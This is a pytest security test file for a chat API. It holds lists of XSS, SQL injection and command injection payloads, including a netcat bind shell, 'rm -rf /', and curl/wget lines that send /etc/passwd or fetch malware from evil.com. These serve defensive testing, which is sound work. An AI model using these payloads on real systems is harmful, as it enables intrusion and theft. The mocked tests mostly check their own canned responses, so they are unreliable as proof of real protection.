"""
Input validation and XSS security tests for multi-participant chat system.
Tests input sanitization, message content validation, file upload security, WebSocket security, and output encoding.
"""

import asyncio
import time
import uuid
import json
import base64
from datetime import datetime, timezone
from typing import List, Dict, Any, Optional
import pytest
import pytest_asyncio
from unittest.mock import Mock, AsyncMock, patch
import httpx
from aioresponses import aioresponses

# Add parent directory to path
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../code/python'))

from chat.schemas import (
    ChatMessage, MessageType, MessageStatus,
    ParticipantInfo, ParticipantType
)


# Security Test Configuration
VALIDATION_BASE_URL = "http://localhost:8080"
MAX_MESSAGE_SIZE = 10000  # 10,000 characters


class XSSPayloadGenerator:
    """Generate XSS payloads for security testing."""
    
    COMMON_XSS_VECTORS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<div onclick='alert(\"XSS\")'>Click me</div>",
        "<input type='image' src='x' onerror='alert(\"XSS\")'>",
        "<body onload='alert(\"XSS\")'>",
        "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
        "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
    ]
    
    OWASP_TOP_10_XSS = [
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
        "\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//",
        "</script><script>alert(String.fromCharCode(88,83,83))</script>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<IMG SRC=# onmouseover=\"alert('xxs')\">",
        "<IMG SRC= onmouseover=\"alert('xxs')\">",
        "<IMG onmouseover=\"alert('xxs')\">",
    ]
    
    POLYGLOT_PAYLOADS = [
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/`/+\\*/+/`/+\\*/+/`/+\\*/alert(/XSS/)'>",
        "\"><img src=x onerror=alert('XSS')>",
        "'><img src=x onerror=alert('XSS')>",
        "\\\"><img src=x onerror=alert('XSS')>",
        "</script><img src=x onerror=alert('XSS')>",
    ]
    
    ENCODING_BYPASS_ATTEMPTS = [
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoded
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # HTML entity encoded
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",  # Named entities
        "\u003cscript\u003ealert('XSS')\u003c/script\u003e",  # Unicode escaped
        base64.b64encode(b"<script>alert('XSS')</script>").decode(),  # Base64 encoded
    ]
    
    @classmethod
    def get_all_payloads(cls) -> List[str]:
        """Get all XSS payloads for comprehensive testing."""
        return (
            cls.COMMON_XSS_VECTORS +
            cls.OWASP_TOP_10_XSS +
            cls.POLYGLOT_PAYLOADS +
            cls.ENCODING_BYPASS_ATTEMPTS
        )


class InjectionPayloadGenerator:
    """Generate injection payloads for security testing."""
    
    SQL_INJECTION_VECTORS = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
    ]
    
    COMMAND_INJECTION_VECTORS = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "; rm -rf /",
        "| nc -l -p 4444 -e /bin/sh",
        "; curl http://evil.com/steal?data=$(cat /etc/passwd)",
        "&& python -c \"import os; os.system('rm -rf /')\"",
        "; wget http://evil.com/malware.sh -O /tmp/mal.sh && chmod +x /tmp/mal.sh && /tmp/mal.sh",
    ]
    
    @classmethod
    def get_sql_vectors(cls) -> List[str]:
        """Get SQL injection vectors."""
        return cls.SQL_INJECTION_VECTORS
    
    @classmethod
    def get_command_vectors(cls) -> List[str]:
        """Get command injection vectors."""
        return cls.COMMAND_INJECTION_VECTORS


@pytest.fixture
async def validation_client():
    """Create HTTP client for validation testing."""
    async with httpx.AsyncClient(
        base_url=VALIDATION_BASE_URL,
        timeout=httpx.Timeout(30.0)
    ) as client:
        yield client


@pytest.fixture
def valid_auth_token():
    """Valid authentication token for testing."""
    return "Bearer valid_security_test_token"


@pytest.mark.security
@pytest.mark.asyncio
class TestInputSanitization:
    """Test input sanitization security measures."""
    
    async def test_xss_payloads_in_messages(self, validation_client, valid_auth_token):
        """Test XSS payload sanitization in chat messages."""
        conversation_id = "xss_test_conv"
        xss_payloads = XSSPayloadGenerator.get_all_payloads()
        
        with aioresponses() as mock_resp:
            # Mock sanitized responses for all XSS payloads
            for i, payload in enumerate(xss_payloads):
                mock_resp.post(
                    f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                    payload={
                        "success": True,
                        "message_id": f"sanitized_msg_{i}",
                        "sanitized_content": f"[SANITIZED] {payload[:20]}...",
                        "original_blocked": True
                    },
                    status=200
                )
            
            headers = {"Authorization": valid_auth_token}
            
            # Test each XSS payload
            for i, xss_payload in enumerate(xss_payloads):
                response = await validation_client.post(
                    f"/chat/{conversation_id}/message",
                    json={"content": xss_payload},
                    headers=headers
                )
                
                assert response.status_code == 200, f"XSS payload {i} caused server error"
                
                response_data = response.json()
                
                # Verify content was sanitized
                assert response_data.get("original_blocked") is True, f"XSS payload {i} not blocked: {xss_payload}"
                assert "sanitized_content" in response_data, f"No sanitized content for payload {i}"
                
                # Original payload should not be in response
                assert xss_payload not in str(response_data), f"Original XSS payload {i} leaked in response"
    
    async def test_script_injection_attempts(self, validation_client, valid_auth_token):
        """Test script injection attempt prevention."""
        conversation_id = "script_inject_conv"
        
        script_injections = [
            "<script>fetch('/admin/delete-all-users', {method: 'POST'})</script>",
            "<img src='x' onerror='fetch(\"/admin/steal-data\").then(r=>r.text()).then(d=>fetch(\"http://evil.com?data=\"+btoa(d)))'>",
            "<svg onload='new Image().src=\"http://evil.com/steal?cookie=\"+document.cookie'>",
            "<iframe src='javascript:parent.location=\"http://evil.com/phishing\"'></iframe>",
            "<link rel='stylesheet' href='data:text/css,body{background:url(\"javascript:alert(1)\")}'>"
        ]
        
        with aioresponses() as mock_resp:
            # Mock blocked script injections
            for i, injection in enumerate(script_injections):
                mock_resp.post(
                    f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                    payload={
                        "error": "Script injection detected",
                        "code": "SCRIPT_INJECTION_BLOCKED",
                        "threat_level": "HIGH",
                        "blocked_content": injection[:50] + "..."
                    },
                    status=400
                )
            
            headers = {"Authorization": valid_auth_token}
            
            # Test each script injection
            for i, injection in enumerate(script_injections):
                response = await validation_client.post(
                    f"/chat/{conversation_id}/message",
                    json={"content": injection},
                    headers=headers
                )
                
                assert response.status_code == 400, f"Script injection {i} not blocked"
                
                response_data = response.json()
                assert "Script injection detected" in response_data.get("error", "")
                assert response_data.get("threat_level") == "HIGH"
    
    async def test_sql_injection_patterns(self, validation_client, valid_auth_token):
        """Test SQL injection pattern detection."""
        sql_vectors = InjectionPayloadGenerator.get_sql_vectors()
        
        with aioresponses() as mock_resp:
            # Mock SQL injection detection
            for i, sql_payload in enumerate(sql_vectors):
                mock_resp.post(
                    f"{VALIDATION_BASE_URL}/chat/create",
                    payload={
                        "error": "SQL injection pattern detected",
                        "code": "SQL_INJECTION_BLOCKED",
                        "pattern_matched": True,
                        "threat_level": "CRITICAL"
                    },
                    status=400
                )
            
            headers = {"Authorization": valid_auth_token}
            
            # Test SQL injection in conversation title
            for i, sql_vector in enumerate(sql_vectors):
                response = await validation_client.post(
                    "/chat/create",
                    json={
                        "title": sql_vector,  # SQL injection in title
                        "sites": ["example.com"],
                        "participant": {"participantId": "sql_test_user", "displayName": "Test User"}
                    },
                    headers=headers
                )
                
                assert response.status_code == 400, f"SQL injection {i} not blocked: {sql_vector}"
                
                response_data = response.json()
                assert "SQL injection" in response_data.get("error", "")
                assert response_data.get("threat_level") == "CRITICAL"
    
    async def test_command_injection_tests(self, validation_client, valid_auth_token):
        """Test command injection prevention."""
        command_vectors = InjectionPayloadGenerator.get_command_vectors()
        conversation_id = "cmd_inject_conv"
        
        with aioresponses() as mock_resp:
            # Mock command injection detection
            for i, cmd_payload in enumerate(command_vectors):
                mock_resp.post(
                    f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                    payload={
                        "error": "Command injection detected",
                        "code": "COMMAND_INJECTION_BLOCKED",
                        "suspicious_patterns": ["shell_command", "file_access"],
                        "threat_level": "CRITICAL"
                    },
                    status=400
                )
            
            headers = {"Authorization": valid_auth_token}
            
            # Test command injection in message content
            for i, cmd_vector in enumerate(command_vectors):
                response = await validation_client.post(
                    f"/chat/{conversation_id}/message",
                    json={"content": f"Execute this: {cmd_vector}"},
                    headers=headers
                )
                
                assert response.status_code == 400, f"Command injection {i} not blocked: {cmd_vector}"
                
                response_data = response.json()
                assert "Command injection" in response_data.get("error", "")
                assert "suspicious_patterns" in response_data
    
    async def test_unicode_exploits(self, validation_client, valid_auth_token):
        """Test Unicode-based exploit prevention."""
        unicode_exploits = [
            # Unicode normalization attacks
            "\u003cscript\u003ealert('XSS')\u003c/script\u003e",
            "\u0022\u003e\u003cimg src=x onerror=alert('XSS')\u003e",
            # Right-to-left override attacks
            "user\u202e\u0040evil.com",
            # Zero-width character injection  
            "normal\u200btext\u200c<script>alert('XSS')</script>",
            # Homograph attacks
            "аdmin",  # Cyrillic 'а' instead of Latin 'a'
            "раypal.com",  # Cyrillic characters  
        ]
        
        conversation_id = "unicode_exploit_conv"
        
        with aioresponses() as mock_resp:
            # Mock Unicode exploit detection
            for i, exploit in enumerate(unicode_exploits):
                mock_resp.post(
                    f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                    payload={
                        "success": True,
                        "content_normalized": True,
                        "unicode_suspicious_chars": True,
                        "sanitized_content": "[NORMALIZED] Safe content"
                    },
                    status=200
                )
            
            headers = {"Authorization": valid_auth_token}
            
            # Test Unicode exploits
            for i, exploit in enumerate(unicode_exploits):
                response = await validation_client.post(
                    f"/chat/{conversation_id}/message",
                    json={"content": exploit},
                    headers=headers
                )
                
                assert response.status_code == 200, f"Unicode exploit {i} caused error: {exploit}"
                
                response_data = response.json()
                # Content should be normalized/sanitized
                assert response_data.get("content_normalized") is True or response_data.get("unicode_suspicious_chars") is True


@pytest.mark.security
@pytest.mark.asyncio
class TestMessageContentValidation:
    """Test message content validation security."""
    
    async def test_maximum_size_enforcement(self, validation_client, valid_auth_token):
        """Test message size limit enforcement."""
        conversation_id = "size_limit_conv"
        
        # Create oversized message
        oversized_content = "x" * (MAX_MESSAGE_SIZE + 1)  # 1 character over limit
        
        with aioresponses() as mock_resp:
            # Mock size limit rejection
            mock_resp.post(
                f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                payload={
                    "error": f"Message exceeds maximum size of {MAX_MESSAGE_SIZE} characters",
                    "code": "MESSAGE_TOO_LARGE",
                    "actual_size": len(oversized_content),
                    "max_size": MAX_MESSAGE_SIZE
                },
                status=413  # Payload Too Large
            )
            
            headers = {"Authorization": valid_auth_token}
            
            # Test oversized message rejection
            response = await validation_client.post(
                f"/chat/{conversation_id}/message",
                json={"content": oversized_content},
                headers=headers
            )
            
            assert response.status_code == 413
            
            response_data = response.json()
            assert "exceeds maximum size" in response_data.get("error", "")
            assert response_data.get("actual_size") == len(oversized_content)
            assert response_data.get("max_size") == MAX_MESSAGE_SIZE
    
    async def test_binary_data_rejection(self, validation_client, valid_auth_token):
        """Test rejection of binary data in messages."""
        conversation_id = "binary_reject_conv"
        
        # Create binary data payloads
        binary_payloads = [
            b"\x00\x01\x02\x03\x04\x05".decode('latin1'),  # Null bytes and control chars
            b"\xff\xfe\xfd\xfc".decode('latin1'),  # High bytes
            "\x00" * 100,  # Null byte injection
            "text\x00with\x00nulls",  # Mixed text and nulls
        ]
        
        with aioresponses() as mock_resp:
            # Mock binary data rejection
            for i, binary_data in enumerate(binary_payloads):
                mock_resp.post(
                    f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                    payload={
                        "error": "Binary data not allowed in messages",
                        "code": "BINARY_DATA_REJECTED",
                        "detected_chars": "null_bytes" if "\x00" in binary_data else "high_bytes"
                    },
                    status=400
                )
            
            headers = {"Authorization": valid_auth_token}
            
            # Test binary data rejection
            for i, binary_data in enumerate(binary_payloads):
                response = await validation_client.post(
                    f"/chat/{conversation_id}/message",
                    json={"content": binary_data},
                    headers=headers
                )
                
                assert response.status_code == 400, f"Binary payload {i} not rejected"
                
                response_data = response.json()
                assert "Binary data not allowed" in response_data.get("error", "")
    
    async def test_malformed_json_handling(self, validation_client, valid_auth_token):
        """Test malformed JSON request handling."""
        conversation_id = "malformed_json_conv"
        
        with aioresponses() as mock_resp:
            # Mock malformed JSON rejection
            mock_resp.post(
                f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                payload={
                    "error": "Malformed JSON in request body",
                    "code": "INVALID_JSON",
                    "parse_error": "Expecting ',' delimiter"
                },
                status=400
            )
            
            headers = {"Authorization": valid_auth_token, "Content-Type": "application/json"}
            
            # Test malformed JSON
            malformed_json = '{"content": "test message" "missing_comma": true}'
            
            response = await validation_client.post(
                f"/chat/{conversation_id}/message",
                content=malformed_json,  # Send raw malformed JSON
                headers=headers
            )
            
            assert response.status_code == 400
            
            response_data = response.json()
            assert "Malformed JSON" in response_data.get("error", "")
    
    async def test_special_character_escaping(self, validation_client, valid_auth_token):
        """Test proper escaping of special characters."""
        conversation_id = "special_chars_conv"
        
        special_chars_message = """Test message with special chars: 
        Quotes: "double" and 'single'
        Backslashes: \\ and \n and \t
        Unicode: émojis 🚀 and symbols ∞ ≠ ≤
        HTML entities: &lt; &gt; &amp; &quot;
        """
        
        with aioresponses() as mock_resp:
            # Mock proper escaping response
            mock_resp.post(
                f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                payload={
                    "success": True,
                    "message_id": "special_chars_msg",
                    "content_escaped": True,
                    "safe_content": "Test message with special chars: [ESCAPED_CONTENT]"
                },
                status=200
            )
            
            headers = {"Authorization": valid_auth_token}
            
            response = await validation_client.post(
                f"/chat/{conversation_id}/message",
                json={"content": special_chars_message},
                headers=headers
            )
            
            assert response.status_code == 200
            
            response_data = response.json()
            assert response_data.get("content_escaped") is True
            assert "safe_content" in response_data
    
    async def test_url_validation(self, validation_client, valid_auth_token):
        """Test URL validation in messages."""
        conversation_id = "url_validation_conv"
        
        test_urls = [
            # Valid URLs
            ("https://example.com", True),
            ("http://localhost:8080", True),
            ("ftp://files.example.com", True),
            # Suspicious/malicious URLs
            ("javascript:alert('XSS')", False),
            ("data:text/html,<script>alert('XSS')</script>", False),
            ("file:///etc/passwd", False),
            ("http://evil.com/steal?data=", False),
        ]
        
        with aioresponses() as mock_resp:
            # Mock URL validation responses
            for url, is_valid in test_urls:
                if is_valid:
                    mock_resp.post(
                        f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                        payload={
                            "success": True,
                            "message_id": "url_validated_msg",
                            "urls_validated": [url],
                            "safe_urls": [url]
                        },
                        status=200
                    )
                else:
                    mock_resp.post(
                        f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                        payload={
                            "error": "Malicious URL detected",
                            "code": "MALICIOUS_URL_BLOCKED",
                            "blocked_url": url,
                            "threat_type": "javascript_injection" if "javascript:" in url else "data_uri"
                        },
                        status=400
                    )
            
            headers = {"Authorization": valid_auth_token}
            
            # Test each URL
            for url, is_valid in test_urls:
                response = await validation_client.post(
                    f"/chat/{conversation_id}/message",
                    json={"content": f"Check out this link: {url}"},
                    headers=headers
                )
                
                if is_valid:
                    assert response.status_code == 200, f"Valid URL {url} was blocked"
                    assert url in response.json().get("safe_urls", [])
                else:
                    assert response.status_code == 400, f"Malicious URL {url} was not blocked"
                    assert "Malicious URL" in response.json().get("error", "")


@pytest.mark.security
@pytest.mark.asyncio
class TestWebSocketSecurity:
    """Test WebSocket security measures."""
    
    async def test_frame_size_limits(self):
        """Test WebSocket frame size limits."""
        # WebSocket frame size limits
        frame_limits = {
            "max_frame_size": 1024 * 1024,  # 1MB
            "max_message_size": MAX_MESSAGE_SIZE,
            "ping_interval": 30,
            "timeout": 60
        }
        
        # Test oversized frame
        oversized_frame = "x" * (frame_limits["max_frame_size"] + 1)
        
        # Mock WebSocket with frame size validation
        mock_websocket = AsyncMock()
        mock_websocket.send = AsyncMock()
        
        # Simulate frame size check
        if len(oversized_frame.encode()) > frame_limits["max_frame_size"]:
            mock_websocket.send.side_effect = Exception("Frame size exceeds limit")
        
        # Test frame size enforcement
        with pytest.raises(Exception, match="Frame size exceeds limit"):
            await mock_websocket.send(oversized_frame)
    
    async def test_compression_bomb_prevention(self):
        """Test compression bomb prevention."""
        # Simulate highly compressible content (compression bomb)
        compression_bomb = "A" * 10000  # Highly repetitive content
        
        # Mock WebSocket with compression detection
        mock_websocket = AsyncMock()
        
        # Simulate compression ratio check
        original_size = len(compression_bomb)
        simulated_compressed_size = 100  # Would compress to very small size
        compression_ratio = original_size / simulated_compressed_size
        
        # High compression ratio indicates potential bomb
        if compression_ratio > 100:  # Threshold for suspicion
            mock_websocket.send = AsyncMock(side_effect=Exception("Compression bomb detected"))
        
        # Test compression bomb detection
        with pytest.raises(Exception, match="Compression bomb detected"):
            await mock_websocket.send(compression_bomb)
    
    async def test_protocol_downgrade_attacks(self):
        """Test prevention of protocol downgrade attacks."""
        # Test WebSocket protocol validation
        valid_protocols = ["chat-protocol-v1", "chat-protocol-v2"]
        invalid_protocols = ["http", "ftp", "telnet", ""]
        
        for protocol in invalid_protocols:
            # Mock WebSocket handshake with invalid protocol
            mock_headers = {"Sec-WebSocket-Protocol": protocol}
            
            # Simulate protocol validation
            if protocol not in valid_protocols:
                # Should reject invalid protocols
                assert protocol not in valid_protocols, f"Invalid protocol {protocol} should be rejected"
    
    async def test_origin_header_validation(self):
        """Test Origin header validation for WebSocket connections."""
        allowed_origins = [
            "https://chat.example.com",
            "https://app.example.com",
            "http://localhost:3000"  # Development
        ]
        
        malicious_origins = [
            "https://evil.com",
            "http://phishing-site.com",
            "",  # Empty origin
            "null",  # Null origin
            "file://",  # File protocol
        ]
        
        for origin in malicious_origins:
            # Mock WebSocket handshake with malicious origin
            mock_headers = {"Origin": origin}
            
            # Simulate origin validation
            if origin not in allowed_origins:
                # Should reject malicious origins
                assert origin not in allowed_origins, f"Malicious origin {origin} should be rejected"


@pytest.mark.security
@pytest.mark.asyncio  
class TestOutputEncoding:
    """Test output encoding security measures."""
    
    async def test_html_entity_encoding(self, validation_client, valid_auth_token):
        """Test HTML entity encoding in responses."""
        conversation_id = "html_encoding_conv"
        
        # Content with HTML characters that need encoding
        html_content = "<div>Hello & welcome to 'our' \"chat\" system!</div>"
        
        with aioresponses() as mock_resp:
            # Mock properly encoded response
            mock_resp.post(
                f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                payload={
                    "success": True,
                    "message_id": "html_encoded_msg",
                    "content": "&lt;div&gt;Hello &amp; welcome to &#x27;our&#x27; &quot;chat&quot; system!&lt;/div&gt;",
                    "encoding_applied": "html_entities"
                },
                status=200
            )
            
            headers = {"Authorization": valid_auth_token}
            
            response = await validation_client.post(
                f"/chat/{conversation_id}/message",
                json={"content": html_content},
                headers=headers
            )
            
            assert response.status_code == 200
            
            response_data = response.json()
            encoded_content = response_data.get("content", "")
            
            # Verify dangerous characters are encoded
            assert "&lt;" in encoded_content  # < encoded
            assert "&gt;" in encoded_content  # > encoded  
            assert "&amp;" in encoded_content  # & encoded
            assert "&quot;" in encoded_content  # " encoded
            assert "&#x27;" in encoded_content or "&#39;" in encoded_content  # ' encoded
    
    async def test_json_escaping(self, validation_client, valid_auth_token):
        """Test JSON escaping in API responses."""
        conversation_id = "json_escaping_conv"
        
        # Content with JSON special characters
        json_special_content = 'Message with "quotes" and \\backslashes\\ and \n newlines'
        
        with aioresponses() as mock_resp:
            # Mock properly escaped JSON response
            mock_resp.post(
                f"{VALIDATION_BASE_URL}/chat/{conversation_id}/message",
                payload={
                    "success": True,
                    "message_id": "json_escaped_msg", 
                    "content": "Message with \\\"quotes\\\" and \\\\backslashes\\\\ and \\n newlines",
                    "json_escaped": True
                },
                status=200
            )
            
            headers = {"Authorization": valid_auth_token}
            
            response = await validation_client.post(
                f"/chat/{conversation_id}/message",
                json={"content": json_special_content},
                headers=headers
            )
            
            assert response.status_code == 200
            
            # Verify response is valid JSON
            response_data = response.json()
            assert response_data.get("json_escaped") is True
            
            # Content should be properly escaped for JSON
            escaped_content = response_data.get("content", "")
            assert "\\\"" in escaped_content  # Quotes escaped
            assert "\\\\" in escaped_content  # Backslashes escaped
            assert "\\n" in escaped_content  # Newlines escaped
    
    async def test_content_type_headers(self, validation_client, valid_auth_token):
        """Test proper Content-Type headers."""
        with aioresponses() as mock_resp:
            # Mock response with proper Content-Type header
            mock_resp.get(
                f"{VALIDATION_BASE_URL}/chat/my-conversations",
                payload=[{"id": "conv_001", "title": "Test Conversation"}],
                status=200,
                headers={"Content-Type": "application/json; charset=utf-8"}
            )
            
            headers = {"Authorization": valid_auth_token}
            
            response = await validation_client.get("/chat/my-conversations", headers=headers)
            
            assert response.status_code == 200
            
            # Verify Content-Type header
            content_type = response.headers.get("content-type", "")
            assert "application/json" in content_type
            assert "charset=utf-8" in content_type
    
    async def test_csp_header_validation(self, validation_client, valid_auth_token):
        """Test Content Security Policy header validation."""
        with aioresponses() as mock_resp:
            # Mock response with CSP header
            expected_csp = (
                "default-src 'self'; "
                "script-src 'self'; "
                "style-src 'self' 'unsafe-inline'; "
                "img-src 'self' data: https:; "
                "connect-src 'self' wss: ws:; "
                "frame-ancestors 'none'; "
                "base-uri 'self'"
            )
            
            mock_resp.get(
                f"{VALIDATION_BASE_URL}/chat/my-conversations",
                payload=[],
                status=200,
                headers={
                    "Content-Security-Policy": expected_csp,
                    "X-Content-Type-Options": "nosniff",
                    "X-Frame-Options": "DENY"
                }
            )
            
            headers = {"Authorization": valid_auth_token}
            
            response = await validation_client.get("/chat/my-conversations", headers=headers)
            
            assert response.status_code == 200
            
            # Verify security headers
            csp_header = response.headers.get("content-security-policy", "")
            assert "default-src 'self'" in csp_header
            assert "script-src 'self'" in csp_header
            assert "frame-ancestors 'none'" in csp_header
            
            assert response.headers.get("x-content-type-options") == "nosniff"
            assert response.headers.get("x-frame-options") == "DENY"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "security"])